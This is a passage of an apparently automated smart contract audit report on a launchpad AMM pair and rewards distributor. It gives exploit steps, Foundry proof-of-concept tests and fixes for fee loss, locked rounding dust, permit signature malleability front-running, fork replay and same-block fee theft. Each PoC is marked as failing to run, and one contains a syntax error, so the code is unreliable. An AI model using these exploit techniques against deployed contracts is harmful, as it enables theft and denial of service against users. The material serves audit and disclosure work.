1) Graduation logic seeds LP and performs a large `pair.swap(...)` to finalize inventory. Because this occurs in the same block as prior `_update()`, `_update()` sees `timeElapsed == 0` and sets `accruedLaunchpadFee{0,1} = newFees` (no distribution).
2) Launchpad calls `distributor.endRewards(pair)` which calls `pair.endRewardsAccrual()`.
3) `endRewardsAccrual()` deletes `accruedLaunchpadFee0/1` and deactivates rewards, then calls `_update(...)` with `newLaunchpadFee{0,1} = 0`.
4) `_update(...)` recomputes reserves using balances and zero fees, absorbing the accrued amount into reserves; no call to `IDistributor.addRewards(...)` occurs. Fees intended for stakers are lost.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";

contract MockERC20 {
    string public name; string public symbol; uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    constructor(string memory n, string memory s) { name = n; symbol = s; }
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; emit Transfer(address(0), to, amount); }
    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount; balanceOf[to] += amount; emit Transfer(msg.sender, to, amount); return true;
    }
    function approve(address sp, uint256 amount) external returns (bool) {
        allowance[msg.sender][sp] = amount; emit Approval(msg.sender, sp, amount); return true;
    }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender]; require(a >= amount, "allow"); allowance[from][msg.sender] = a - amount;
        require(balanceOf[from] >= amount, "bal"); balanceOf[from] -= amount; balanceOf[to] += amount; emit Transfer(from, to, amount); return true;
    }
}

contract MockDistributor {
    bool public addRewardsCalled;
    uint256 public last0; uint256 public last1;
    function addRewards(address, address, uint128 amount0, uint128 amount1) external {
        addRewardsCalled = true; last0 = amount0; last1 = amount1;
    }
}

contract FeeBurnOnGraduationTest is Test {
    GTELaunchpadV2Pair pair;
    MockERC20 t0; MockERC20 t1;
    address launchpadLp = address(0xBEEF);
    MockDistributor distributor;

    function setUp() public {
        t0 = new MockERC20("T0", "T0");
        t1 = new MockERC20("T1", "T1");
        distributor = new MockDistributor();

        pair = new GTELaunchpadV2Pair();
        // factory is address(this) by constructor, so initialize works here
        pair.initialize(address(t0), address(t1), launchpadLp, address(distributor));

        // seed initial liquidity to LP and mint LP tokens to launchpadLp
        t0.mint(address(this), 1_000_000 ether);
        t1.mint(address(this), 1_000_000 ether);
        t0.transfer(address(pair), 1_000 ether);
        t1.transfer(address(pair), 1_000 ether);
        pair.mint(launchpadLp);
    }

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) internal pure returns (uint) {
        require(amountOut < reserveOut, "insufficient");
        uint numerator = reserveIn * amountOut * 1000;
        uint denominator = (reserveOut - amountOut) * 997;
        return (numerator / denominator) + 1;
    }

    function test_FeeBurnOnGraduation() public {
        (uint112 r0, uint112 r1,) = pair.getReserves();

        // Plan a swap: token0 in, token1 out
        uint amount1Out = uint(r1) / 100; // 1% of reserve1
        uint amount0In = getAmountIn(amount1Out, r0, r1);

        // Provide input and perform the swap
        t0.mint(address(this), amount0In);
        t0.transfer(address(pair), amount0In);
        pair.swap(0, amount1Out, address(this), "");

        // Fees accrued in same block (not distributed yet)
        (uint112 acc0, uint112 acc1,) = pair.getAccruedLaunchpadFees();
        assertGt(acc0, 0);
        assertEq(acc1, 0);

        // Expected fee per _getLaunchpadFees formula
        uint totalLp = pair.totalSupply();
        uint lpBal = pair.balanceOf(launchpadLp) + pair.MINIMUM_LIQUIDITY();
        uint expectedFee0 = (amount0In * pair.REWARDS_FEE_SHARE() * lpBal) / (totalLp * 1000);
        assertEq(uint(acc0), expectedFee0);

        // Record reserves before endRewards
        (uint112 res0Before, uint112 res1Before,) = pair.getReserves();

        // End rewards accrual in same block (by distributor)
        vm.prank(address(distributor));
        pair.endRewardsAccrual();

        // Accrued fees were zeroed and never distributed
        assertEq(pair.accruedLaunchpadFee0(), 0);
        assertEq(distributor.addRewardsCalled(), false);

        // Reserves absorbed the fees ("burned" to LP)
        (uint112 res0After, uint112 res1After,) = pair.getReserves();
        assertEq(uint(res0After), uint(res0Before) + uint(acc0));
        assertEq(res1After, res1Before);
    }
}


## Suggested Mitigation
In `GTELaunchpadV2Pair.endRewardsAccrual()`, first distribute any accrued fees before zeroing and deactivating:
- Read the current `accruedLaunchpadFee0/1` into local variables.
- If either is non-zero, call `_distributeLaunchpadFees(fee0, fee1)` (this will `approve` and let the Distributor `safeTransferFrom` the exact amounts).
- Then `delete accruedLaunchpadFee0; delete accruedLaunchpadFee1; delete rewardsPoolActive;` and finally call `_update(...)` to resync reserves.
This ensures even if `timeElapsed == 0` in the graduation block, the fees are paid out to the Distributor instead of being absorbed into reserves.





 **Derived From** : Issue Type: PrecisionDriftAccumulation / Precision Loss leading to Stuck Funds

## [M-7]. Precision Drift Permanently Locks Funds Preventing Skim

### Finding Severity Justification: Rewards rounding in RewardsTrackerLib.update() can zero-out small pending rewards while the Distributor’s totalPendingRewards is still increased by the full deposited amount. Those rounded-off amounts become unclaimable by users and cannot be skimmed by the admin due to the skimExcessRewards guard (amount > balance - totalPendingRewards). This leads to permanent locking of funds (matured yield) but does not enable theft. Impact is real and can accumulate over time, but there is no adversarial gain; hence Medium.
## Derived From Pattern/Invariant
Issue Type: PrecisionDriftAccumulation / Precision Loss leading to Stuck Funds

## Exploit Type
RoundingError

## Location
Distributor.skimExcessRewards

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
Due to the precision loss identified in the `RewardsTrackerLib`, rewards that round to zero during the `update()` calculation are removed from the internal `pendingBaseRewards` / `pendingQuoteRewards` variables but are never added to the `accRewardPerShare`. 

However, the `Distributor` contract tracks the full deposited amount in `totalPendingRewards`. The `skimExcessRewards` function enforces that only funds *exceeding* `totalPendingRewards` can be withdrawn (`amount > balance - totalPendingRewards`). Since `totalPendingRewards` includes the 'lost' dust amounts that users can never claim (due to the zero accumulator), `totalPendingRewards` permanently effectively exceeds the claimable liability. This renders the dust amounts (which can be substantial over time) permanently locked in the contract, inaccessible to both users and the admin.

## Impact
A portion of deposited rewards can be irreversibly lost due to integer division in RewardsTrackerLib.update(): when pendingRewards * 1e12 / totalShares is zero, the library clears pending but does not increase the accumulator. The Distributor continues accounting the full deposit in totalPendingRewards, while users can never claim the rounded-off dust. Because skimExcessRewards only permits withdrawing balance - totalPendingRewards, the dust becomes permanently locked in the contract. Over time this can accumulate to material amounts (especially for 6-decimal assets like USDC and large totalShares), reducing effective yield and trapping funds without any recovery path for the admin.

## Command to Run Test


## Proof of Concept
High-level exploit steps:
1) Initialize a rewards pool for (launchAsset, quoteAsset) via Distributor.createRewardsPair.
2) As launchpad, stake a very large share count (e.g., totalShares = 1e24) for a user so that (pending * 1e12 / totalShares) rounds to 0 for small deposits.
3) Add a tiny amount of quoteAsset rewards (e.g., 1 unit for a 6-decimal token, 0.000001 USDC), which increases Distributor.totalPendingRewards[quoteAsset] by 1 and transfers the token into Distributor.
4) Trigger RewardsTrackerLib.update() by calling increaseStake again. Because delta = pending * 1e12 / totalShares = 0, the library deletes pendingQuoteRewards but does not increase accQuoteRewardPerShare.
5) No user can claim these rewards (accumulator unchanged), yet totalPendingRewards[quoteAsset] remains increased by 1.
6) Owner attempts to skimExcessRewards(quoteAsset, 1). The check is if (amount > balance - totalPendingRewards) revert. Since balance == 1 and totalPendingRewards == 1, balance - totalPendingRewards == 0, so 1 > 0 holds and the call reverts.
7) The 1 unit is now stuck permanently: not claimable by users and not skimmable by the admin.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "contracts/launchpad/Distributor.sol";

interface IERC20Like {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

import {ERC20} from "@openzeppelin/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    uint8 private _dec;
    constructor(string memory n, string memory s, uint8 d) ERC20(n, s) { _dec = d; }
    function decimals() public view override returns (uint8) { return _dec; }
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract DistributorSkimLockTest is Test {
    Distributor distributor;
    MockERC20 base;   // launchAsset
    MockERC20 quote;  // quoteAsset (e.g. USDC)

    address alice = address(0xA11CE);

    function setUp() public {
        distributor = new Distributor();
        // Make this test contract the launchpad
        distributor.initialize(address(this));

        base = new MockERC20("LAU", "LAU", 18);
        quote = new MockERC20("USDC", "USDC", 6);

        // Create rewards pair as launchpad
        distributor.createRewardsPair(address(base), address(quote));

        // Give alice massive shares so that pending * 1e12 / totalShares == 0 for tiny rewards
        distributor.increaseStake(address(base), alice, uint96(1e24));
    }

    function test_PrecisionDriftLocksFunds() public {
        // Mint tiny reward to this contract and add as quote reward
        quote.mint(address(this), 1); // 1 unit = 0.000001 USDC
        quote.approve(address(distributor), 1);

        // Add 1 unit of quote rewards (permissionless)
        distributor.addRewards(address(base), address(quote), 0, 1);
        assertEq(quote.balanceOf(address(distributor)), 1, "reward not transferred in");
        assertEq(distributor.totalPendingRewards(address(quote)), 1, "totalPending not increased");

        // Trigger update to zero-out pending due to rounding but keep totalPendingRewards unchanged
        distributor.increaseStake(address(base), alice, uint96(1));

        // Skim should revert since balance - totalPendingRewards == 0
        vm.expectRevert(Distributor.SkimOverflow.selector);
        distributor.skimExcessRewards(address(quote), 1);

        // Funds remain stuck in contract
        assertEq(quote.balanceOf(address(distributor)), 1, "dust should be stuck");
        assertEq(distributor.totalPendingRewards(address(quote)), 1, "accounting remains overstated");
    }
}


## Suggested Mitigation
Prevent losing remainder in RewardsTrackerLib.update() and keep undistributed dust in pending so it can be distributed later. For each asset, compute the per-share delta and the actually distributable amount, then retain the remainder:
- Replace the current update logic:
  if (self.pendingBaseRewards > 0) { self.accBaseRewardPerShare = newAccBaseRewardsPerShare; delete self.pendingBaseRewards; }
  with:
  if (self.pendingBaseRewards > 0) {
      uint96 ts = self.totalShares;
      if (ts > 0) {
          uint256 delta = (uint256(self.pendingBaseRewards) * PRECISION_FACTOR) / uint256(ts);
          if (delta > 0) {
              self.accBaseRewardPerShare += delta;
              uint256 distributed = (delta * uint256(ts)) / PRECISION_FACTOR;
              self.pendingBaseRewards = uint128(uint256(self.pendingBaseRewards) - distributed);
          }
          // If delta == 0, leave pendingBaseRewards untouched so it aggregates with future deposits
      }
  }
- Do the same for quote rewards.

This ensures no rewards are silently discarded and totalPendingRewards in Distributor will eventually be decreased when users claim. As an additional defense-in-depth, consider emitting events when rounding leaves non-zero remainder so off-chain monitoring can track accrued dust. If changing the library is not feasible, alternatively track and subtract "lost dust" from totalPendingRewards in Distributor whenever update() yields zero delta, but the library-side fix is cleaner and preserves user funds.





 **Derived From** : SignatureMalleability

## [L-8]. Malleable Permit Signature allows Front-running DoS

### Finding Severity Justification: The issue allows a front-runner to consume a user’s permit nonce by using the malleable (n - s) signature, causing the user’s combined permit+action transaction to revert. While this is a real, permissionless DoS vector, it does not enable asset theft or unauthorized approvals (spender/value/owner are fixed in the signed digest). Impact is limited to transaction failure and the need to re-sign, which aligns with QA/Low per Code4rena norms for EIP-2612 s-malleability.
## Derived From Pattern/Invariant
SignatureMalleability

## Exploit Type
SignatureMalleability

## Location
UniswapV2ERC20.permit

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `UniswapV2ERC20.permit` function uses `ecrecover` without checking that the `s` value of the signature is in the lower half of the secp256k1 curve (`s <= n/2`). An attacker can observe a valid permit transaction, construct a signature with the complementary `s` value (which is also valid), and front-run the transaction. This consumes the nonce and causes the user's original transaction to revert.

## Impact
Denial of Service for users utilizing permit-based transactions (e.g., via Router).

## Command to Run Test


## Proof of Concept
Scenario: A user signs an EIP-2612 permit for (owner, spender, value, nonce=0, deadline) and submits a tx that does permit + action (e.g., a Router call). An attacker observes this pending tx, derives a second valid signature by setting s' = n - s and flipping v (27 <-> 28), and front-runs calling permit(owner, spender, value, deadline, v', r, s'). The permit succeeds (same digest, just the malleated signature), incrementing owner’s nonce to 1. The victim’s original tx then executes, but its permit verification recomputes the digest with nonce=1 while the signature was for nonce=0, causing ecrecover to fail and the whole tx to revert. No approvals are hijacked (spender/value/owner remain the same), but the victim suffers a DoS for that tx and must re-submit.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "@gte-univ2-core/UniswapV2ERC20.sol";

contract PermitSMalleabilityTest is Test {
    // secp256k1 curve order
    uint256 constant SECP256K1N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;

    UniswapV2ERC20 token;
    uint256 ownerPk;
    address owner;
    address spender;

    function setUp() public {
        token = new UniswapV2ERC20();
        ownerPk = 0xA11CE;
        owner = vm.addr(ownerPk);
        spender = address(0xBEEF);
        vm.warp(1000);
    }

    function _digest(uint256 value, uint256 deadline, uint256 nonce) internal view returns (bytes32) {
        bytes32 structHash = keccak256(
            abi.encode(
                token.PERMIT_TYPEHASH(),
                owner,
                spender,
                value,
                nonce,
                deadline
            )
        );
        return keccak256(abi.encodePacked("\x19\x01", token.DOMAIN_SEPARATOR(), structHash));
    }

    function test_MalleablePermitFrontRunDoS() public {
        uint256 value = 123;
        uint256 deadline = block.timestamp + 1 days;

        // User signs for current nonce (0)
        bytes32 digest = _digest(value, deadline, token.nonces(owner));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerPk, digest);

        // Attacker derives malleated signature: s' = n - s, v' toggled
        uint256 sNum = uint256(s);
        bytes32 sPrime = bytes32(SECP256K1N - sNum);
        uint8 vPrime = (v == 27) ? 28 : 27;

        // Attacker front-runs and consumes the nonce with the malleated signature
        vm.prank(address(0xBAD1));
        token.permit(owner, spender, value, deadline, vPrime, r, sPrime);

        // Nonce incremented; allowance set as per victim's intent
        assertEq(token.nonces(owner), 1, "nonce not consumed");
        assertEq(token.allowance(owner, spender), value, "allowance not set");

        // Victim's original permit (for nonce 0) now reverts due to INVALID_SIGNATURE
        vm.expectRevert(bytes("UniswapV2: INVALID_SIGNATURE"));
        token.permit(owner, spender, value, deadline, v, r, s);
    }
}


## Suggested Mitigation
In permit, enforce canonical low-s and valid v. Example: require(v == 27 || v == 28, "INVALID_V"); require(uint256(s) <= 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0, "INVALID_S"); Optionally use OpenZeppelin’s ECDSA library (ECDSA.recover) which already enforces lower-s and simplifies signature handling.





 **Derived From** : PricePrecisionOrRoundingError

## [H-9]. RewardsTrackerLib uses insufficient PRECISION_FACTOR (1e12) causing total loss of yield

### Finding Severity Justification: Pending rewards are integer-divided by totalShares with PRECISION_FACTOR=1e12, then pending is zeroed. When (pending * 1e12) < totalShares, the accRewardPerShare increment is 0 and that entire pending batch is permanently lost. Given large share totals (uint96) and especially 6-decimal quote rewards (e.g., USDC), this can realistically result in consistent, material loss of matured yield. Lost rewards become unclaimable and remain stuck in the Distributor, constituting permanent user yield loss, which per rubric is High.
## Derived From Pattern/Invariant
PricePrecisionOrRoundingError

## Exploit Type
RoundingError

## Location
RewardsTrackerLib.getAccRewardsPerShare

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 7
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
RewardsTrackerLib defines `PRECISION_FACTOR = 1e12`. The accumulation formula is `acc += (pending * 1e12) / totalShares`. For tokens with high supply (e.g., 1e12 tokens = 1e30 wei), `totalShares` is very large. If `totalShares` exceeds `pending * 1e12`, the division results in 0. Since `pendingBaseRewards` is reset to 0 after every update, small reward accruals are permanently deleted without increasing the accumulator. For high-supply meme coins (common on launchpads), this can lead to 100% loss of rewards.

## Impact
When pending rewards are applied, the library computes acc += (pending * PRECISION_FACTOR) / totalShares and then unconditionally deletes pending. If (pending * PRECISION_FACTOR) < totalShares, the increment is 0, and the entire pending batch is zeroed out. Those tokens have already been transferred into Distributor and counted in totalPendingRewards, but no user can ever claim them, and admins cannot skim them due to the totalPendingRewards guard. This permanently locks rewards inside Distributor, creating persistent yield loss for stakers and stranded funds for the protocol.

## Command to Run Test


## Proof of Concept
Scenario (base-asset rewards):
- totalShares = 1e24 (feasible with high-supply tokens; shares are uint96).
- pendingBaseRewards = 1e11 (e.g., a small USDC reward amount).
- PRECISION_FACTOR = 1e12.
Computation in getAccRewardsPerShare:
- inc = (pending * PRECISION_FACTOR) / totalShares = (1e11 * 1e12) / 1e24 = 1e23 / 1e24 = 0.
Then update() sets accBaseRewardPerShare += 0 and deletes pendingBaseRewards. Result: rewards are not credited to users, and the moved tokens remain stuck in Distributor forever because claimable amounts remain 0 while totalPendingRewards still includes the transferred tokens.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "contracts/launchpad/Distributor.sol";

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory n, string memory s, uint8 d) {
        name = n; symbol = s; decimals = d;
    }

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        unchecked { balanceOf[msg.sender] -= amount; balanceOf[to] += amount; }
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) {
            require(a >= amount, "allow");
            unchecked { allowance[from][msg.sender] = a - amount; }
        }
        unchecked { balanceOf[from] -= amount; balanceOf[to] += amount; }
        emit Transfer(from, to, amount);
        return true;
    }
}

contract PrecisionLossTest is Test {
    Distributor d;
    MockERC20 base;
    MockERC20 quote;

    address launchpad = address(this);
    address user = address(0xBEEF);

    // Parameters chosen to force rounding-to-zero with PRECISION_FACTOR=1e12
    uint96 constant SHARES = 1e24;         // large total shares
    uint128 constant REWARD = 1e11;        // small pending reward

    function setUp() public {
        d = new Distributor();
        d.initialize(launchpad);
        base = new MockERC20("BASE", "BASE", 18);
        quote = new MockERC20("QUOTE", "QUOTE", 18);

        // create rewards pair (base, quote)
        d.createRewardsPair(address(base), address(quote));

        // give the launchpad some tokens to fund rewards
        base.mint(address(this), 1e24);

        // simulate staking to set totalShares > 0
        d.increaseStake(address(base), user, SHARES);

        // fund Distributor with a small reward that will round to zero per-share increment
        base.approve(address(d), REWARD);
        d.addRewards(address(base), address(quote), REWARD, 0);

        // Sanity: totalPending increased and Distributor holds the tokens
        assertEq(d.totalPendingRewards(address(base)), REWARD, "pending not tracked");
        assertEq(base.balanceOf(address(d)), REWARD, "Distributor balance");
    }

    function testPrecisionLoss_ZeroAccIncrementAndRewardsStuck() public {
        // User triggers update via claim; with current math, inc == 0, pending is deleted
        vm.prank(user);
        (uint256 baseAmt, uint256 quoteAmt) = d.claimRewards(address(base));
        assertEq(baseAmt, 0, "no base claimable");
        assertEq(quoteAmt, 0, "no quote claimable");

        // Verify pool state: pendingBaseRewards zeroed, but acc did not increase
        RewardPoolDataMemory pm = d.getRewardsPoolData(address(base));
        assertEq(pm.pendingBaseRewards, 0, "pending should be zeroed");
        assertEq(pm.accBaseRewardPerShare, 0, "acc not increased");

        // Tokens remain stuck in Distributor with totalPendingRewards unchanged
        assertEq(d.totalPendingRewards(address(base)), REWARD, "pending still counted");
        assertEq(base.balanceOf(address(d)), REWARD, "tokens stuck in Distributor");
    }
}


## Suggested Mitigation
Two complementary fixes:
1) Raise PRECISION_FACTOR high enough so that pending * PRECISION_FACTOR >= totalShares for any non-zero pending. Given totalShares is uint96 (max ≈ 7.9e28), set PRECISION_FACTOR to 1e36. This prevents the acc increment from rounding to zero and also makes distribution dust effectively zero for typical token decimals.
2) Preserve and carry forward the undistributed remainder instead of deleting pending. In update():
- Compute scaled = uint256(pending) * PRECISION_FACTOR; inc = scaled / totalShares.
- If inc > 0: acc += inc; distributed = (inc * totalShares) / PRECISION_FACTOR; pending -= uint128(distributed).
- Do not delete pending; only reduce by distributed so any remainder rolls into the next update.
Either approach eliminates loss. Using both ensures robustness against edge cases and maintains exact conservation of rewards.





 **Derived From** : PermitDomainSeparator

## [L-10]. Static DOMAIN_SEPARATOR allows Cross-Chain/Fork Replay

### Finding Severity Justification: Caching the EIP-712 DOMAIN_SEPARATOR at deployment enables signature replay across a future chain fork with a different chainId. Impact is limited to fork scenarios and only enables approvals (permit) which then require a spender to act; main chain funds are unaffected. This is a known pattern with low likelihood on production L2s and is generally considered a best-practice gap rather than an immediate high-impact exploit.
## Derived From Pattern/Invariant
PermitDomainSeparator

## Exploit Type
PermitDomainSeparator

## Location
UniswapV2ERC20.constructor

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `UniswapV2ERC20` constructor calculates `DOMAIN_SEPARATOR` using the `chainId` at deployment time. This value is immutable. If the chain forks (resulting in a new Chain ID), the contract on the new chain will still accept signatures valid for the old Chain ID. This allows replay attacks where a permit signed for one chain is executed on the other.

## Impact
On a future chain fork where the chainId changes, a permit signature created for the original chain can be replayed on the fork because DOMAIN_SEPARATOR is cached at deployment. This allows the same signature to grant an allowance on the fork even though the chainId differs. Funds on the original (pre-fork) chain are unaffected; only the forked chain is at risk of unauthorized approvals and subsequent token transfers by a spender using the replayed permit.

## Command to Run Test


## Proof of Concept
High-level replay scenario:
1) On chain A (e.g., chainId = 1), a user signs an EIP-2612 permit for the LP token (spender S, value V, deadline D). The signature digest includes the contract’s cached DOMAIN_SEPARATOR built with chainId = 1.
2) The network later forks into chain B (chainId = 2). The deployed LP token still stores the same cached DOMAIN_SEPARATOR from chain A (chainId = 1).
3) Anyone can submit the exact same permit on chain B. Because the contract uses the cached DOMAIN_SEPARATOR (still reflecting chainId = 1), the signature validates and sets allowance for S on chain B.
4) Spender S can now transferFrom the user’s tokens on the fork. This is a cross-chain/fork replay of the same signature. Original chain A funds remain unaffected.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";

contract VulnERC20Like {
    string public constant name = "Uniswap V2";
    string public constant symbol = "UNI-V2";
    uint8 public constant decimals = 18;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    // Cached at deployment (vulnerable to fork replay)
    bytes32 public DOMAIN_SEPARATOR;
    // keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)")
    bytes32 public constant PERMIT_TYPEHASH = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;
    mapping(address => uint256) public nonces;

    constructor() {
        uint256 chainId;
        assembly { chainId := chainid() }
        DOMAIN_SEPARATOR = keccak256(
            abi.encode(
                keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
                keccak256(bytes(name)),
                keccak256(bytes("1")),
                chainId,
                address(this)
            )
        );
    }

    function _approve(address owner, address spender, uint256 value) private {
        allowance[owner][spender] = value;
    }

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external {
        require(deadline >= block.timestamp, "EXPIRED");
        bytes32 digest = keccak256(
            abi.encodePacked(
                "\x19\x01",
                DOMAIN_SEPARATOR,
                keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, nonces[owner]++, deadline))
            )
        );
        address recovered = ecrecover(digest, v, r, s);
        require(recovered != address(0) && recovered == owner, "INVALID_SIG");
        _approve(owner, spender, value);
    }

    // helper for test
    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

contract PermitForkReplayTest is Test {
    // Domain constants for recomputation
    bytes32 constant EIP712_DOMAIN_TYPEHASH = keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)");
    string constant NAME = "Uniswap V2";
    string constant VERSION = "1";

    function _buildPermitDigest(
        VulnERC20Like token,
        address owner,
        address spender,
        uint256 value,
        uint256 deadline
    ) internal returns (bytes32) {
        bytes32 structHash = keccak256(
            abi.encode(token.PERMIT_TYPEHASH(), owner, spender, value, token.nonces(owner)(), deadline)
        );
        return keccak256(abi.encodePacked("\x19\x01", token.DOMAIN_SEPARATOR(), structHash));
    }

    function test_Permit_Replay_Across_Fork() public {
        // 1) Deploy on chain A (id=1), cache DOMAIN_SEPARATOR with chainId=1
        vm.chainId(1);
        VulnERC20Like token = new VulnERC20Like();

        // Prepare a permit signed under chainId=1
        address owner = vm.addr(0xA11CE);
        address spender = vm.addr(0xB0B);
        uint256 value = 123e9;
        uint256 deadline = block.timestamp + 1 days;

        bytes32 digest = _buildPermitDigest(token, owner, spender, value, deadline);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(0xA11CE, digest);

        // 2) Simulate fork: change chainId to 2
        vm.chainId(2);

        // The cached DOMAIN_SEPARATOR did NOT change.
        // If computed dynamically, it would be with chainId=2 and differ.
        bytes32 expectedDomainFork = keccak256(
            abi.encode(
                EIP712_DOMAIN_TYPEHASH,
                keccak256(bytes(NAME)),
                keccak256(bytes(VERSION)),
                uint256(2),
                address(token)
            )
        );
        assertTrue(token.DOMAIN_SEPARATOR() != expectedDomainFork, "Domain should be stale after fork");

        // 3) Replay: same signature validates on chainId=2 because contract uses cached DOMAIN_SEPARATOR
        token.permit(owner, spender, value, deadline, v, r, s);
        assertEq(token.allowance(owner, spender), value, "Allowance set via replayed permit on fork");
    }
}


## Suggested Mitigation
Adopt a dynamic EIP-712 domain separator that accounts for chainId changes, following the OpenZeppelin ERC20Permit pattern:
- Store initialChainId and initialDomainSeparator in the constructor.
- Replace direct uses of the cached DOMAIN_SEPARATOR variable with a function that recomputes when block.chainid changes:

  uint256 private immutable _INITIAL_CHAIN_ID;
  bytes32 private immutable _INITIAL_DOMAIN_SEPARATOR;

  constructor() {
      _INITIAL_CHAIN_ID = block.chainid;
      _INITIAL_DOMAIN_SEPARATOR = _buildDomainSeparator(_INITIAL_CHAIN_ID);
  }

  function DOMAIN_SEPARATOR() public view returns (bytes32) {
      return block.chainid == _INITIAL_CHAIN_ID ? _INITIAL_DOMAIN_SEPARATOR : _buildDomainSeparator(block.chainid);
  }

  function _buildDomainSeparator(uint256 chainId) private view returns (bytes32) {
      return keccak256(
          abi.encode(
              keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
              keccak256(bytes(name)),
              keccak256(bytes("1")),
              chainId,
              address(this)
          )
      );
  }

- In permit(), use DOMAIN_SEPARATOR() (the function) instead of the cached variable.

This fully prevents cross-chain/fork replay of permits while remaining gas-efficient on non-forked chains.





 **Derived From** : ReserveOrPriceDesync

## [M-11]. Accrued fees incorrectly counted as user input allowing Fee Theft

### Finding Severity Justification: Undistributed launchpad fees accumulated within the same block are excluded from reserves but included in balances. swap() computes amountIn from balance - reserve, so these undistributed fees are incorrectly credited as user input. An attacker can perform a zero/low-input swap after a large same-block trade and extract value from the pool roughly equal to the accrued fee amount (≈ launchpad fee share, e.g., ~0.1% of the prior trade’s input value), causing real loss to LP reserves. Impact is concrete but bounded to the size of same-block accrued fees, not an unbounded drain, hence Medium.
## Derived From Pattern/Invariant
ReserveOrPriceDesync

## Exploit Type
AccountingInvariantViolation

## Location
GTELaunchpadV2Pair.swap

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 7
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
In `GTELaunchpadV2Pair`, fees are accrued into `accruedLaunchpadFee` variables but are only distributed (and removed from the contract balance) if `timeElapsed > 0`. If multiple swaps occur in the same block (`timeElapsed == 0`), the distribution is skipped, but the `_reserve` variables are updated to exclude the fees. `swap` calculates user input as `amountIn = balance - reserve`. Since `balance` includes the undistributed fees but `reserve` does not, the contract treats the accrued fees as part of the user's input amount, effectively allowing the user to swap the protocol's fees for output tokens.

## Impact
Accrued launchpad fees from prior swaps in the same block are excluded from reserves but remain in token balances. On the next same-block swap, swap() computes amountIn from balance - reserve, mistakenly attributing the accrued fees to the user. This enables a zero-input (or low-input) swap to extract output tokens from LP reserves, with loss roughly equal to the value of the accrued fees (bounded by the launchpad fee share of the previous trade). The immediate loss is borne by LPs (pool reserves), while the Distributor still later receives the accrued fee tokens, causing a net drain to LPs approximately equal to the same-block accrued fees. Severity is Medium due to bounded per-block impact.

## Command to Run Test


## Proof of Concept
Preconditions: There is a freshly updated blockTimestampLast set in mint() (or any _update) earlier in the same block; launchpadFeeDistributor is non-zero; launchpadLp holds LP tokens (so _getLaunchpadFees > 0).

1) Add liquidity and call mint() in block N. This sets blockTimestampLast = now.
